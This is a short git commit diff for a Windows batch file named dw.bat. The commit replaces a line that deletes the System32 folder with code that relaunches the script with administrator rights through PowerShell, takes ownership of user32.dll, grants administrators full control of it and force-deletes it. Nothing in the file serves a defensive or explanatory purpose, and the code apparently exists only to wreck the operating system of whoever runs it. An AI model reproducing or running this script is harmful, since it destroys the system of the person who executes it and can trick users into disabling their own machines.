224df29d198f81f80412853caa5680f9f9a9db8b
EEBroadband <107469677+EEBroadband@users.noreply.github.com>
2024-08-02 22:58:46 +0100

    dw

--- dw.bat
+++ dw.bat
@@ -1,2 +1,8 @@
 @echo off
-del "C:\Windows\System32"
+
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin; exit /b)
+
+
+takeown /f "C:\Windows\System32\user32.dll"
+icacls "C:\Windows\System32\user32.dll" /grant administrators:F /T
+del /f "C:\Windows\System32\user32.dll"
